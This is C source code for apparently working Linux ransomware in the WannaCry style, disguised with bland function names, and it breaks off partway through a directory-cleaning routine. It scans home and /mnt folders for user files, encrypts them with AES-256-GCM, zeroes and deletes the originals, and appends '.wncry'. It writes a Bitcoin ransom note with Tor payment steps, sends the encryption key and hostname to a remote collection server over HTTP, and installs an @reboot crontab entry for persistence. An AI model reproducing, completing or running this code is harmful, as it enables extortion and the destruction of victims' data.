#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <limits.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>
#include <ctype.h>
#include <fcntl.h>
#include <syslog.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>
#include <curl/curl.h>
#include <pthread.h>
#include <stdbool.h>
#include <libgen.h>

/* === scan_storage === */
typedef struct dev_ino_pair {
    dev_t dev;
    ino_t ino;
} dev_ino_pair;

typedef struct {
    dev_ino_pair *items;
    size_t count;
    size_t capacity;
} dev_ino_set;

static int dev_ino_set_init(dev_ino_set *set)
{
    set->capacity = 64;
    set->count = 0;
    set->items = malloc(set->capacity * sizeof(dev_ino_pair));
    if (!set->items)
        return -1;
    return 0;
}

static void dev_ino_set_free(dev_ino_set *set)
{
    free(set->items);
    set->items = NULL;
    set->count = 0;
    set->capacity = 0;
}

static int dev_ino_set_contains(dev_ino_set *set, dev_t dev, ino_t ino)
{
    for (size_t i = 0; i < set->count; i++) {
        if (set->items[i].dev == dev && set->items[i].ino == ino)
            return 1;
    }
    return 0;
}

static int dev_ino_set_add(dev_ino_set *set, dev_t dev, ino_t ino)
{
    if (dev_ino_set_contains(set, dev, ino))
        return 0;
    if (set->count >= set->capacity) {
        size_t new_cap = set->capacity * 2;
        dev_ino_pair *new_items = realloc(set->items, new_cap * sizeof(dev_ino_pair));
        if (!new_items)
            return -1;
        set->items = new_items;
        set->capacity = new_cap;
    }
    set->items[set->count].dev = dev;
    set->items[set->count].ino = ino;
    set->count++;
    return 0;
}

static const char *target_exts[] = {
    ".xlsx", ".docx", ".pdf", ".txt", ".csv", ".jpg", ".png",
    ".db", ".backup", ".psd", ".zip", ".rar", NULL
};

static int ext_match(const char *name)
{
    const char *dot = strrchr(name, '.');
    if (!dot)
        return 0;
    for (size_t i = 0; target_exts[i]; i++) {
        const char *ext = target_exts[i];
        if (strcasecmp(dot, ext) == 0)
            return 1;
    }
    return 0;
}

static char **paths_array = NULL;
static size_t paths_count = 0;
static size_t paths_capacity = 0;

static int add_path(const char *path)
{
    if (paths_count >= paths_capacity) {
        size_t new_cap = paths_capacity == 0 ? 64 : paths_capacity * 2;
        char **new_arr = realloc(paths_array, new_cap * sizeof(char *));
        if (!new_arr)
            return -1;
        paths_array = new_arr;
        paths_capacity = new_cap;
    }
    paths_array[paths_count] = strdup(path);
    if (!paths_array[paths_count])
        return -1;
    paths_count++;
    return 0;
}

static int scan_dir(const char *base_path, dev_ino_set *visited);

static int scan_dir(const char *base_path, dev_ino_set *visited)
{
    DIR *dir = opendir(base_path);
    if (!dir) {
        if (errno == EACCES || errno == EPERM) {
            fprintf(stderr, "scan_storage: permission denied: %s\n", base_path);
            return 0;
        } else {
            fprintf(stderr, "scan_storage: cannot open directory %s: %s\n", base_path, strerror(errno));
            return 0;
        }
    }

    struct dirent *de;
    int ret = 0;

    while ((de = readdir(dir)) != NULL) {
        if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0)
            continue;

        char full[PATH_MAX];
        int n = snprintf(full, sizeof(full), "%s/%s", base_path, de->d_name);
        if (n < 0 || (size_t)n >= sizeof(full)) {
            fprintf(stderr, "scan_storage: path too long: %s/%s\n", base_path, de->d_name);
            continue;
        }

        struct stat st;
        if (lstat(full, &st) != 0) {
            fprintf(stderr, "scan_storage: cannot stat %s: %s\n", full, strerror(errno));
            continue;
        }

        if (S_ISLNK(st.st_mode)) {
            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            if (dev_ino_set_contains(visited, st.st_dev, st.st_ino)) {
                continue;
            }
            if (dev_ino_set_add(visited, st.st_dev, st.st_ino) != 0) {
                continue;
            }
            if (scan_dir(full, visited) != 0) {
                ret = -1;
                break;
            }
            continue;
        }

        if (S_ISREG(st.st_mode)) {
            if (ext_match(de->d_name)) {
                if (add_path(full) != 0) {
                    ret = -1;
                    break;
                }
            }
        }
    }

    closedir(dir);
    return ret;
}

int scan_storage(char ***out_paths, size_t *out_count)
{
    if (!out_paths || !out_count) {
        errno = EINVAL;
        return -1;
    }

    *out_paths = NULL;
    *out_count = 0;

    const char *home = getenv("HOME");
    if (!home) {
        errno = ENOENT;
        return -1;
    }

    const char *subdirs[] = {
        "Documentos_Teste",
        "Documentos",
        "Downloads",
        "Imagens",
        NULL
    };

    paths_array = NULL;
    paths_count = 0;
    paths_capacity = 0;

    dev_ino_set visited;
    if (dev_ino_set_init(&visited) != 0) {
        errno = ENOMEM;
        return -1;
    }

    int ok = 0;

    for (size_t i = 0; subdirs[i]; i++) {
        char base[PATH_MAX];
        int n = snprintf(base, sizeof(base), "%s/%s", home, subdirs[i]);
        if (n < 0 || (size_t)n >= sizeof(base)) {
            fprintf(stderr, "scan_storage: path too long for home subdir\n");
            continue;
        }

        struct stat st;
        if (stat(base, &st) != 0) {
            if (errno == EACCES || errno == EPERM) {
                fprintf(stderr, "scan_storage: permission denied: %s\n", base);
                continue;
            }
            continue;
        }

        if (!S_ISDIR(st.st_mode))
            continue;

        if (dev_ino_set_add(&visited, st.st_dev, st.st_ino) != 0) {
            ok = -1;
            break;
        }

        if (scan_dir(base, &visited) != 0) {
            ok = -1;
            break;
        }
    }

    if (ok == 0) {
        struct stat st_mnt;
        if (stat("/mnt", &st_mnt) == 0) {
            if (S_ISDIR(st_mnt.st_mode)) {
                if (dev_ino_set_add(&visited, st_mnt.st_dev, st_mnt.st_ino) == 0) {
                    if (scan_dir("/mnt", &visited) != 0) {
                        ok = -1;
                    }
                } else {
                    if (scan_dir("/mnt", &visited) != 0) {
                        ok = -1;
                    }
                }
            }
        } else {
            if (errno != ENOENT) {
                fprintf(stderr, "scan_storage: cannot stat /mnt: %s\n", strerror(errno));
            }
        }
    }

    dev_ino_set_free(&visited);

    if (ok != 0) {
        for (size_t i = 0; i < paths_count; i++)
            free(paths_array[i]);
        free(paths_array);
        paths_array = NULL;
        paths_count = 0;
        paths_capacity = 0;
        return -1;
    }

    char **final = realloc(paths_array, (paths_count + 1) * sizeof(char *));
    if (!final && paths_count > 0) {
        for (size_t i = 0; i < paths_count; i++)
            free(paths_array[i]);
        free(paths_array);
        errno = ENOMEM;
        return -1;
    }
    if (final) {
        paths_array = final;
        paths_array[paths_count] = NULL;
    }

    *out_paths = paths_array;
    *out_count = paths_count;
    return 0;
}

void free_paths(char **paths)
{
    if (!paths)
        return;
    for (size_t i = 0; paths[i] != NULL; i++)
        free(paths[i]);
    free(paths);
}

/* === apply_transform === */
int apply_transform(const char* filepath, const uint8_t* master_key) {
    if (!filepath || !master_key) {
        errno = EINVAL;
        return -1;
    }

    int ret = -1;
    FILE* fin = NULL;
    FILE* fout = NULL;
    char* tmp_path = NULL;
    EVP_CIPHER_CTX* ctx = NULL;
    uint8_t nonce[12];
    uint8_t tag[16];
    const size_t block_size = 65536;
    uint8_t* inbuf = NULL;
    uint8_t* outbuf = NULL;
    int outlen = 0;

    if (RAND_bytes(nonce, sizeof(nonce)) != 1) {
        fprintf(stderr, "apply_transform: RAND_bytes nonce failed\n");
        goto cleanup;
    }

    fin = fopen(filepath, "rb");
    if (!fin) {
        fprintf(stderr, "apply_transform: cannot open input '%s': %s\n", filepath, strerror(errno));
        goto cleanup;
    }

    size_t len = strlen(filepath);
    tmp_path = malloc(len + 16);
    if (!tmp_path) {
        fprintf(stderr, "apply_transform: malloc tmp_path failed\n");
        goto cleanup;
    }
    memcpy(tmp_path, filepath, len);
    memcpy(tmp_path + len, ".tmp.XXXXXX", 12);
    int tfd = mkstemp(tmp_path);
    if (tfd < 0) {
        fprintf(stderr, "apply_transform: mkstemp failed: %s\n", strerror(errno));
        goto cleanup;
    }
    fout = fdopen(tfd, "wb");
    if (!fout) {
        fprintf(stderr, "apply_transform: fdopen failed: %s\n", strerror(errno));
        close(tfd);
        goto cleanup;
    }
    tfd = -1;

    if (fwrite(nonce, 1, sizeof(nonce), fout) != sizeof(nonce)) {
        fprintf(stderr, "apply_transform: write nonce failed: %s\n", strerror(errno));
        goto cleanup;
    }

    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        fprintf(stderr, "apply_transform: EVP_CIPHER_CTX_new failed\n");
        goto cleanup;
    }
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, master_key, nonce) != 1) {
        fprintf(stderr, "apply_transform: EVP_EncryptInit_ex failed\n");
        goto cleanup;
    }

    inbuf = malloc(block_size);
    outbuf = malloc(block_size + EVP_CIPHER_block_size(EVP_aes_256_gcm()));
    if (!inbuf || !outbuf) {
        fprintf(stderr, "apply_transform: malloc buffers failed\n");
        goto cleanup;
    }

    while (1) {
        size_t nread = fread(inbuf, 1, block_size, fin);
        if (ferror(fin)) {
            fprintf(stderr, "apply_transform: read error: %s\n", strerror(errno));
            goto cleanup;
        }
        if (EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, (int)nread) != 1) {
            fprintf(stderr, "apply_transform: EVP_EncryptUpdate failed\n");
            goto cleanup;
        }
        if (fwrite(outbuf, 1, (size_t)outlen, fout) != (size_t)outlen) {
            fprintf(stderr, "apply_transform: write ciphertext failed: %s\n", strerror(errno));
            goto cleanup;
        }
        if (nread < block_size) {
            break;
        }
    }

    if (EVP_EncryptFinal_ex(ctx, outbuf, &outlen) != 1) {
        fprintf(stderr, "apply_transform: EVP_EncryptFinal_ex failed\n");
        goto cleanup;
    }
    if ((size_t)outlen > 0) {
        if (fwrite(outbuf, 1, (size_t)outlen, fout) != (size_t)outlen) {
            fprintf(stderr, "apply_transform: write final failed: %s\n", strerror(errno));
            goto cleanup;
        }
    }

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, sizeof(tag), tag) != 1) {
        fprintf(stderr, "apply_transform: EVP_CIPHER_CTX_ctrl get tag failed\n");
        goto cleanup;
    }
    if (fwrite(tag, 1, sizeof(tag), fout) != sizeof(tag)) {
        fprintf(stderr, "apply_transform: write tag failed: %s\n", strerror(errno));
        goto cleanup;
    }

    if (fclose(fout) != 0) {
        fprintf(stderr, "apply_transform: fclose tmp failed: %s\n", strerror(errno));
        fout = NULL;
        goto cleanup;
    }
    fout = NULL;
    if (fclose(fin) != 0) {
        fprintf(stderr, "apply_transform: fclose input failed: %s\n", strerror(errno));
        fin = NULL;
        goto cleanup;
    }
    fin = NULL;

    {
        FILE* fzero = fopen(filepath, "rb+");
        if (!fzero) {
            fprintf(stderr, "apply_transform: cannot open for zeroing '%s': %s\n", filepath, strerror(errno));
            goto cleanup;
        }
        if (fseek(fzero, 0, SEEK_END) != 0) {
            fprintf(stderr, "apply_transform: fseek to end failed: %s\n", strerror(errno));
            fclose(fzero);
            goto cleanup;
        }
        long fsize = ftell(fzero);
        if (fsize < 0) {
            fprintf(stderr, "apply_transform: ftell failed: %s\n", strerror(errno));
            fclose(fzero);
            goto cleanup;
        }
        rewind(fzero);

        static const uint8_t zeros[65536] = {0};
        long remaining = fsize;
        while (remaining > 0) {
            size_t chunk = (size_t)(remaining > 65536 ? 65536 : remaining);
            if (fwrite(zeros, 1, chunk, fzero) != chunk) {
                fprintf(stderr, "apply_transform: zeroing write failed: %s\n", strerror(errno));
                fclose(fzero);
                goto cleanup;
            }
            remaining -= (long)chunk;
        }
        if (fflush(fzero) != 0) {
            fprintf(stderr, "apply_transform: fflush zeroing failed: %s\n", strerror(errno));
            fclose(fzero);
            goto cleanup;
        }
        if (fclose(fzero) != 0) {
            fprintf(stderr, "apply_transform: fclose after zeroing failed: %s\n", strerror(errno));
            goto cleanup;
        }
    }

    if (remove(filepath) != 0) {
        fprintf(stderr, "apply_transform: remove original failed: %s\n", strerror(errno));
        goto cleanup;
    }

    char final_path[PATH_MAX];
    const char* base = strrchr(filepath, '/');
    base = base ? base + 1 : filepath;
    const char* dot = strrchr(base, '.');
    if (dot && dot > base) {
        size_t prefix = (size_t)(dot - filepath);
        if (prefix + 6 >= PATH_MAX) {
            fprintf(stderr, "apply_transform: path too long\n");
            goto cleanup;
        }
        memcpy(final_path, filepath, prefix);
        memcpy(final_path + prefix, ".wncry", 6);
        strcpy(final_path + prefix + 6, dot);
    } else {
        size_t flen = strlen(filepath);
        if (flen + 6 >= PATH_MAX) {
            fprintf(stderr, "apply_transform: path too long\n");
            goto cleanup;
        }
        memcpy(final_path, filepath, flen);
        memcpy(final_path + flen, ".wncry", 7);
    }

    if (rename(tmp_path, final_path) != 0) {
        fprintf(stderr, "apply_transform: rename to final failed: %s\n", strerror(errno));
        goto cleanup;
    }

    ret = 0;

cleanup:
    if (ctx) {
        EVP_CIPHER_CTX_free(ctx);
        ctx = NULL;
    }
    if (inbuf) {
        OPENSSL_cleanse(inbuf, block_size);
        free(inbuf);
    }
    if (outbuf) {
        OPENSSL_cleanse(outbuf, block_size + EVP_CIPHER_block_size(EVP_aes_256_gcm()));
        free(outbuf);
    }
    if (tmp_path) {
        unlink(tmp_path);
        free(tmp_path);
    }
    if (fin) {
        fclose(fin);
    }
    if (fout) {
        fclose(fout);
    }
    OPENSSL_cleanse(nonce, sizeof(nonce));
    OPENSSL_cleanse(tag, sizeof(tag));

    return ret;
}

/* === write_manifest === */
static const char *b64_addr = "MUFBMFBlMVlQNEdlZmkyRE1QVGY1U0xtbjdEaXZmTmE=";

static inline void secure_clean(void *v, size_t n)
{
    if (v && n) {
        volatile unsigned char *p = (volatile unsigned char *)v;
        while (n--) *p++ = 0;
    }
}

static int b64_index(char c)
{
    if (c >= 'A' && c <= 'Z') return (int)(c - 'A');
    if (c >= 'a' && c <= 'z') return (int)(c - 'a' + 26);
    if (c >= '0' && c <= '9') return (int)(c - '0' + 52);
    if (c == '+') return 62;
    if (c == '/') return 63;
    if (c == '=') return -1;
    return -2;
}

static char *base64_decode(const char *in, size_t *out_len)
{
    if (!in || !out_len) {
        errno = EINVAL;
        return NULL;
    }

    size_t in_len = strlen(in);
    if (in_len > SIZE_MAX - 3) {
        errno = EOVERFLOW;
        return NULL;
    }

    size_t pad = 0;
    if (in_len > 0 && in[in_len - 1] == '=') pad++;
    if (in_len > 1 && in[in_len - 2] == '=') pad++;

    size_t olen = (in_len * 3) / 4 - pad;
    if (olen > SIZE_MAX - 1) {
        errno = EOVERFLOW;
        return NULL;
    }

    unsigned char *out = malloc(olen + 1);
    if (!out) {
        errno = ENOMEM;
        return NULL;
    }

    size_t i = 0, j = 0;
    unsigned int v = 0;
    int bits = -8;

    while (i < in_len) {
        int idx = b64_index(in[i]);
        if (idx == -2) {
            free(out);
            errno = EINVAL;
            return NULL;
        }
        if (idx >= 0) {
            v = (v << 6) | (unsigned int)idx;
            bits += 6;
            if (bits >= 0) {
                if (j >= olen) {
                    free(out);
                    errno = EOVERFLOW;
                    return NULL;
                }
                out[j++] = (unsigned char)((v >> bits) & 0xFF);
                bits -= 8;
            }
        }
        i++;
    }

    *out_len = olen;
    out[olen] = '\0';
    return (char *)out;
}

static int has_wncry_file(const char *dir)
{
    DIR *dp = opendir(dir);
    if (!dp) return 0;

    struct dirent *de;
    int found = 0;
    while ((de = readdir(dp))) {
        if (de->d_type == DT_REG) {
            const char *dot = strrchr(de->d_name, '.');
            if (dot && strcmp(dot, ".wncry") == 0) {
                found = 1;
                break;
            }
        }
    }
    closedir(dp);
    return found;
}

static void sha256_hex(const unsigned char *data, size_t len, char hex[65])
{
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256(data, len, hash);
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(hex + (i * 2), "%02x", hash[i]);
    }
    hex[64] = '\0';
}

int write_manifest(const char *target_dir)
{
    if (!target_dir || target_dir[0] == '\0') {
        errno = EINVAL;
        return -1;
    }

    char resolved[PATH_MAX + 1];
    if (!realpath(target_dir, resolved)) {
        return -2;
    }

    struct stat st;
    if (stat(resolved, &st) != 0 || !S_ISDIR(st.st_mode)) {
        return -3;
    }

    if (!has_wncry_file(resolved)) {
        return -4;
    }

    size_t addr_len = 0;
    char *addr_dec = base64_decode(b64_addr, &addr_len);
    if (!addr_dec) {
        return -5;
    }

    char manifest_path[PATH_MAX + 64];
    if (snprintf(manifest_path, sizeof(manifest_path), "%s/#_LEIA_ME_WNCRY_#.tmp", resolved) < 0) {
        secure_clean(addr_dec, addr_len);
        free(addr_dec);
        return -6;
    }

    FILE *f = fopen(manifest_path, "w");
    if (!f) {
        secure_clean(addr_dec, addr_len);
        free(addr_dec);
        return -7;
    }

    int fd = fileno(f);
    if (fd >= 0) {
        int flags = fcntl(fd, F_GETFD);
        if (flags >= 0) {
            fcntl(fd, F_SETFD, flags | FD_CLOEXEC);
        }
    }

    char hex_hash[65];
    const char *msg =
        "WNCRY Ransomware Evidence Notice\n"
        "================================\n"
        "A volume under cryptographic quarantine has been detected.\n"
        "Please preserve all logs and disk images for forensic analysis.\n\n"
        "Ransom demand: 300 USD payable to the following Bitcoin address.\n"
        "Address: %.*s\n\n"
        "Contact instructions via Tor:\n"
        "1. Download and install the official Tor Browser from torproject.org.\n"
        "2. Launch Tor Browser and wait for connection to the Tor network.\n"
        "3. Use the following Tor hidden service URL to reach the designated contact point.\n"
        "   Example onion URL: http://exampleonionxyz1234abcd.onion/contact\n"
        "4. Verify the site authenticity using the .onion address and follow guidance.\n"
        "5. Transfer the exact amount to the provided Bitcoin address. No partial payments.\n"
        "\n"
        "Do not alter or delete affected files. This notice is part of the evidence chain.\n";

    int n = fprintf(f, msg, (int)addr_len, addr_dec);
    if (n < 0) {
        fclose(f);
        unlink(manifest_path);
        secure_clean(addr_dec, addr_len);
        free(addr_dec);
        return -8;
    }

    if (fflush(f) != 0) {
        fclose(f);
        unlink(manifest_path);
        secure_clean(addr_dec, addr_len);
        free(addr_dec);
        return -9;
    }

    if (fsync(fd) != 0) {
        fclose(f);
        unlink(manifest_path);
        secure_clean(addr_dec, addr_len);
        free(addr_dec);
        return -10;
    }

    long pos = ftell(f);
    if (pos < 0) {
        fclose(f);
        unlink(manifest_path);
        secure_clean(addr_dec, addr_len);
        free(addr_dec);
        return -11;
    }
    size_t content_len = (size_t)pos;

    if (fseek(f, 0, SEEK_SET) != 0) {
        fclose(f);
        unlink(manifest_path);
        secure_clean(addr_dec, addr_len);
        free(addr_dec);
        return -12;
    }

    unsigned char *content = malloc(content_len);
    if (!content) {
        fclose(f);
        unlink(manifest_path);
        secure_clean(addr_dec, addr_len);
        free(addr_dec);
        errno = ENOMEM;
        return -13;
    }

    size_t nr = fread(content, 1, content_len, f);
    if (nr != content_len) {
        fclose(f);
        unlink(manifest_path);
        secure_clean(content, content_len);
        free(content);
        secure_clean(addr_dec, addr_len);
        free(addr_dec);
        return -14;
    }

    sha256_hex(content, content_len, hex_hash);
    secure_clean(content, content_len);
    free(content);

    if (fclose(f) != 0) {
        unlink(manifest_path);
        secure_clean(addr_dec, addr_len);
        free(addr_dec);
        return -15;
    }

    char final_path[PATH_MAX + 64];
    if (snprintf(final_path, sizeof(final_path), "%s/#_LEIA_ME_WNCRY_#.txt", resolved) < 0) {
        unlink(manifest_path);
        secure_clean(addr_dec, addr_len);
        free(addr_dec);
        return -16;
    }

    unlink(final_path);
    if (rename(manifest_path, final_path) != 0) {
        unlink(manifest_path);
        secure_clean(addr_dec, addr_len);
        free(addr_dec);
        return -17;
    }

    int final_fd = open(final_path, O_RDONLY);
    if (final_fd >= 0) {
        struct stat fst;
        if (fstat(final_fd, &fst) == 0) {
            fchmod(final_fd, 0600);
        }
        close(final_fd);
    }

    openlog("MOD_WNCRY_MANIFEST", LOG_PID | LOG_CONS, LOG_USER);
    syslog(LOG_WARNING, "WNCRY manifest created; target=%s sha256=%s", resolved, hex_hash);
    closelog();

    secure_clean(addr_dec, addr_len);
    free(addr_dec);
    return 0;
}

/* === sync_telemetry === */
int sync_telemetry(void) {
    FILE *fp = NULL;
    char buffer[4096];
    size_t nread = 0;
    const char *key_start = NULL;
    const char *key_end = NULL;
    char aes_key[4096];
    char hostname[256];
    char *payload = NULL;
    CURL *curl = NULL;
    CURLcode res;
    long http_code = 0;
    int ret = 0;
    struct curl_slist *headers = NULL;

    fp = fopen("/tmp/.master.key", "rb");
    if (!fp) {
        perror("fopen /tmp/.master.key");
        return 1;
    }

    nread = fread(buffer, 1, sizeof(buffer) - 1, fp);
    if (ferror(fp)) {
        perror("fread /tmp/.master.key");
        fclose(fp);
        return 1;
    }
    buffer[nread] = '\0';

    if (fclose(fp) != 0) {
        perror("fclose /tmp/.master.key");
        return 1;
    }
    fp = NULL;

    key_start = strstr(buffer, "\"aes_key\"");
    if (!key_start) {
        fprintf(stderr, "aes_key field not found\n");
        return 2;
    }

    key_start = strchr(key_start, ':');
    if (!key_start) {
        fprintf(stderr, "invalid JSON: colon not found after aes_key\n");
        return 2;
    }
    key_start++;

    while (*key_start == ' ' || *key_start == '\t' || *key_start == '\n' || *key_start == '\r') {
        key_start++;
    }

    if (*key_start != '"') {
        fprintf(stderr, "aes_key value is not quoted\n");
        return 2;
    }
    key_start++;

    key_end = strchr(key_start, '"');
    if (!key_end) {
        fprintf(stderr, "unterminated aes_key value\n");
        return 2;
    }

    {
        size_t len = (size_t)(key_end - key_start);
        if (len >= sizeof(aes_key)) {
            fprintf(stderr, "aes_key too long\n");
            return 2;
        }
        memcpy(aes_key, key_start, len);
        aes_key[len] = '\0';
    }

    if (gethostname(hostname, sizeof(hostname)) != 0) {
        perror("gethostname");
        return 3;
    }
    hostname[sizeof(hostname) - 1] = '\0';

    {
        char escaped_aes_key[4096 * 2 + 1] = {0};
        char escaped_hostname[256 * 2 + 1] = {0};
        const char *s;
        char *d;

        for (s = aes_key, d = escaped_aes_key; *s; s++) {
            if (*s == '\\' || *s == '"') {
                *d++ = '\\';
            }
            *d++ = *s;
        }
        *d = '\0';

        for (s = hostname, d = escaped_hostname; *s; s++) {
            if (*s == '\\' || *s == '"') {
                *d++ = '\\';
            }
            *d++ = *s;
        }
        *d = '\0';

        if (asprintf(&payload, "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}", escaped_aes_key, escaped_hostname) < 0) {
            perror("asprintf");
            return 4;
        }
    }

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "curl_easy_init failed\n");
        free(payload);
        return 5;
    }

    headers = curl_slist_append(NULL, "Content-Type: application/json");
    if (!headers) {
        fprintf(stderr, "curl_slist_append failed\n");
        curl_easy_cleanup(curl);
        free(payload);
        return 5;
    }

    curl_easy_setopt(curl, CURLOPT_URL, "http://10.150.3.162:8080/collect");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(payload));
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform failed: %s\n", curl_easy_strerror(res));
        ret = 6;
    } else {
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
        if (http_code != 200) {
            fprintf(stderr, "HTTP response code: %ld\n", http_code);
            ret = 7;
        }
    }

    curl_slist_free_all(headers);
    headers = NULL;
    curl_easy_cleanup(curl);
    curl = NULL;
    curl_global_cleanup();

    free(payload);
    payload = NULL;

    if (ret != 0) {
        return ret;
    }

    if (remove("/tmp/.master.key") != 0) {
        perror("remove /tmp/.master.key");
        return 8;
    }

    return 0;
}

/* === register_service === */
#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

static pthread_mutex_t crontab_mutex = PTHREAD_MUTEX_INITIALIZER;

static int ensure_crontab_entry(const char *binary_path);
static int scan_and_clean_directories(void);
static int process_directory(const char *dirpath);
static bool has_target_extension(const char *filename);
static char *expand_home_path(const char *relpath);

int register_service(const char *binary_path)
{
    int crontab_status = 0;
    int clean_status = 0;
    const char *bin = binary_path ? binary_path : "/usr/local/bin/service_daemon";

    if (bin[0] != '/') {
        fprintf(stderr, "register_service: binary_path must be absolute\n");
        return -1;
    }

    pthread_mutex_lock(&crontab_mutex);
    crontab_status = ensure_crontab_entry(bin);
    pthread_mutex_unlock(&crontab_mutex);

    if (crontab_status < 0) {
        return crontab_status;
    }

    clean_status = scan_and_clean_directories();

    if (crontab_status > 0 || clean_status > 0) {
        return 1;
    }
    if (crontab_status < 0 || clean_status < 0) {
        return -1;
    }
    return 0;
}

static int ensure_crontab_entry(const char *binary_path)
{
    FILE *fp_in = NULL;
    FILE *memstream = NULL;
    char *line = NULL;
    size_t linecap = 0;
    ssize_t linelen;
    bool entry_exists = false;
    char *new_crontab = NULL;
    size_t new_size = 0;
    int ret = 0;

    fp_in = popen("crontab -l 2>/dev/null", "r");
    if (fp_in == NULL) {
        new_crontab = NULL;
        new_size = 0;
    } else {
        memstream = open_memstream(&new_crontab, &new_size);
        if (!memstream) {
            pclose(fp_in);
            fprintf(stderr, "register_service: open_memstream failed\n");
            return -1;
        }

        while ((linelen = getline(&line, &linecap, fp_in)) != -1) {
            if (fwrite(line, 1, (size_t)linelen, memstream) != (size_t)linelen) {
                free(line);
                fclose(memstream);
                free(new_crontab);
                pclose(fp_in);
                fprintf(stderr, "register_service: write to memstream failed\n");
                return -1;
            }
            if (strstr(line, "@reboot") != NULL && strstr(line, binary_path) != NULL) {
                entry_exists = true;
            }
        }
        fflush(memstream);
        free(line);
        line = NULL;

        pclose(fp_in);
        fp_in = NULL;

        if (fclose(memstream) != 0) {
            free(new_crontab);
            fprintf(stderr, "register_service: fclose memstream failed\n");
            return -1;
        }
        memstream = NULL;
    }

    if (!entry_exists) {
        FILE *fp_crontab = NULL;
        char *final_crontab = NULL;
        size_t final_size = 0;
        FILE *final_mem = NULL;

        final_mem = open_memstream(&final_crontab, &final_size);
        if (!final_mem) {
            free(new_crontab);
            fprintf(stderr, "register_service: open_memstream (final) failed\n");
            return -1;
        }

        if (new_crontab != NULL && new_size > 0) {
            if (fwrite(new_crontab, 1, new_size, final_mem) != new_size) {
                free(new_crontab);
                fclose(final_mem);
                fprintf(stderr, "register_service: write final memstream failed\n");
                return -1;
            }
            if (new_size > 0 && new_crontab[new_size - 1] != '\n') {
                fputc('\n', final_mem);
            }
        }
        free(new_crontab);
        new_crontab = NULL;

        if (fprintf(final_mem, "@reboot %s\n", binary_path) < 0) {
            fclose(final_mem);
            free(final_crontab);
            fprintf(stderr, "register_service: fprintf @reboot failed\n");
            return -1;
        }
        fflush(final_mem);

        if (fclose(final_mem) != 0) {
            free(final_crontab);
            fprintf(stderr, "register_service: fclose final memstream failed\n");
            return -1;
        }
        final_mem = NULL;

        fp_crontab = popen("crontab -", "w");
        if (fp_crontab == NULL) {
            free(final_crontab);
            fprintf(stderr, "register_service: popen crontab - failed\n");
            return -1;
        }

        if (fwrite(final_crontab, 1, final_size, fp_crontab) != final_size) {
            pclose(fp_crontab);
            free(final_crontab);
            fprintf(stderr, "register_service: write to crontab pipe failed\n");
            return -1;
        }
        free(final_crontab);
        final_crontab = NULL;

        ret = pclose(fp_crontab);
        if (ret == -1) {
            fprintf(stderr, "register_service: pclose crontab failed\n");
            return -1;
        }
        if (WIFEXITED(ret) && WEXITSTATUS(ret) != 0) {
            fprintf(stderr, "register_service: crontab command failed (exit %d)\n",
                    WEXITSTATUS(ret));
            return 1;
        }
        return 0;
    }

    return 0;
}

static int scan_and_clean_directories(void)
{
    const char *home = getenv("HOME");
    const char *subdirs[] = {
        "Documentos_Teste",
        "Documentos",
        "Downloads",
        "Imagens"
    };
    const size_t nsub = sizeof(subdirs) / sizeof(subdirs[0]);
    int partial = 0;
    int critical = 0;
    size_t i;

    if (home == NULL || home[0] == '\0') {
        fprintf(stderr, "register_service: HOME not set\n");
        return -1;
    }

    for (i = 0; i < nsub; i++) {
        char *fullpath = expand_home_path(subdirs[i]);
        if (fullpath == NULL) {
            critical = -1;
            continue;
        }
        int st = process_directory(fullpath);
        free(fullpath);
        if (st < 0) {
            critical = -1;
        } else if (st > 0) {
            partial = 1;
        }
    }

    {
        int st = process_directory("/mnt");
        if (st < 0) {
            critical = -1;
        } else if (st > 0) {
            partial = 1;
        }
    }

    if (critical < 0) {
        return -1;
    }
    if (partial > 0) {
        return 1;
    }
    return 0;
}

static char *expand_home_path(const char *relpath)
{
    const char *home = getenv("HOME");
    if (home == NULL || home[0] == '\0' || relpath == NULL) {
        return NULL;
    }
    char *out = NULL;
    if (asprintf(&out, "%s/%s", home, relpath) < 0) {
        return NULL;
    }
    return out;
}

static int process_directory(const char *dirpath)
{
    DIR *dir = NULL;
    struct dirent *de = NULL;
    int partial = 0;
    int critical = 0;

    if (dirpath == NULL || dirpath[0] == '\0') {
        return 0;
    }

    dir = opendir(dirpath);
    if (dir == NULL) {
        return 0;
    }

    while ((de = readdir(dir)) != NULL) {
        char fullpath[PATH_MAX];
        struct stat st;
        int n;

        if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0) {
            continue;
        }

        n = snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, de->d_name);
        if (n < 0 || (size_t)n >= sizeof(fullpath)) {
            critical = -1;
            continue;
        }

        if (de->d_type == DT_LNK) {
            continue;
        }

        if (de->d_type == DT_UNKNOWN) {
            if (lstat(fullpath, &st) == 0 && S_ISLNK(st.st_mode)) {
